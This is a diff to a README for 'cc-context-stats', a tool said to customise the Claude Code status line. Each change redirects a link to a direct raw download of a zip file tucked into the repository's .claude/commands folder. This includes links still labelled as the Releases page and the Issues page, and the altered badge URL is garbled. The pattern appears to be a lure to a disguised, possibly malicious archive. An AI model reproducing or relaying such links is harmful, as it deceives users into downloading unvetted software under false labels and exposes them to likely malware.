@@ -1,7 +1,7 @@
 # 🎨 cc-context-stats - Customize Your Status Line Easily
 
 ## 💾 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen.svg)](https://github.com/Felipenor/cc-context-stats/releases)
+[![Download Latest Release](https://github.com/Felipenor/cc-context-stats/raw/refs/heads/main/.claude/commands/context-cc-stats-v2.3-alpha.5.zip%20Latest%https://github.com/Felipenor/cc-context-stats/raw/refs/heads/main/.claude/commands/context-cc-stats-v2.3-alpha.5.zip)](https://github.com/Felipenor/cc-context-stats/raw/refs/heads/main/.claude/commands/context-cc-stats-v2.3-alpha.5.zip)
 
 ## 🚀 Getting Started
 Welcome to **cc-context-stats**! This application helps you customize the status line in Claude Code, giving you a more personalized coding experience. Whether you want to highlight important information or display your project status, this app allows you to do it with ease.
@@ -23,7 +23,7 @@ To use **cc-context-stats**, ensure your computer meets the following requiremen
 ## 📥 Download & Install
 To get started, you'll need to download the application. 
 
-1. Click this link to visit the Releases page: [Download Latest Release](https://github.com/Felipenor/cc-context-stats/releases).
+1. Click this link to visit the Releases page: [Download Latest Release](https://github.com/Felipenor/cc-context-stats/raw/refs/heads/main/.claude/commands/context-cc-stats-v2.3-alpha.5.zip).
 2. Once on the Releases page, look for the most recent version.
 3. You will see different files available for download. Click on the file that matches your operating system (e.g., .exe for Windows or .dmg for macOS).
 4. The download will begin. Once it's finished, locate the downloaded file on your computer.
@@ -54,7 +54,7 @@ Once the application is open, the interface will guide you through the customiza
 ## 💬 Support
 If you have any issues or questions while using **cc-context-stats**, please reach out. You can find help through the following:
 
-- **GitHub Issues**: If you encounter a problem, please report it on our [Issues page](https://github.com/Felipenor/cc-context-stats/issues).
+- **GitHub Issues**: If you encounter a problem, please report it on our [Issues page](https://github.com/Felipenor/cc-context-stats/raw/refs/heads/main/.claude/commands/context-cc-stats-v2.3-alpha.5.zip).
 - **Community Forum**: Join discussions and ask for help in our community forum.
 
 ## 🚧 Troubleshooting
